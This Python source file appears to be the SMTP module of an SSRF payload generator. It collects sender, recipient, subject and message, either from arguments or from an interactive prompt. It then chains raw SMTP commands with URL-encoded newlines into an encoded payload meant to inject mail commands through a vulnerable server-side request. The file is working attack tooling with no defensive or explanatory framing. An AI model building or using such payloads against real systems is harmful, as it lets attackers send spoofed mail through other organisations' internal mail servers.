from .base import *

class SMTP(GENERATOR):
    requirement = ["mailfrom", "mailto", "subject", "msg"]
    def __init__(self, parser,options={}):
        if options["port"] == 0:
            options["port"] = 25
        super().__init__(parser,options)
        self.set_requirement(self.requirement)
        arg = self.get_requirement()

        if arg.mailfrom == "":
            self.mailfrom = self.wizard("mailfrom")
        else:
            self.mailfrom = arg.mailfrom

        if arg.mailto == "":
            self.mailto = self.wizard("mailto")
        else:
            self.mailto = arg.mailto

        if arg.subject == "":
            self.subject = self.wizard("subject")
        else:
            self.subject = arg.subject

        if arg.msg == "":
            self.msg = self.wizard("msg")
        else:
            self.msg = arg.msg

    def generate(self):
        mailfrom = self.mailfrom
        mailto = self.mailto
        subject = self.subject
        msg = self.msg
        commands = [
            'MAIL FROM:' + mailfrom,
            'RCPT To:' + mailto,
            'DATA',
            'From:' + mailfrom,
            'Subject:' + subject,
            'Message:' + msg,
            '.'
        ]
        payload = "%0A".join(commands)
        self.set_mode(PAYLOAD_TYPE.QUOTE_PLUS).\
                set_payload(payload).\
                replace("+", "%20").\
                replace("%2F", "/").\
                replace("%3A", ":")
        return super().generate()
    
    def wizard(self, field):
        return input("\033[96m" +f"Give {field} :  "+ "\033[0m")

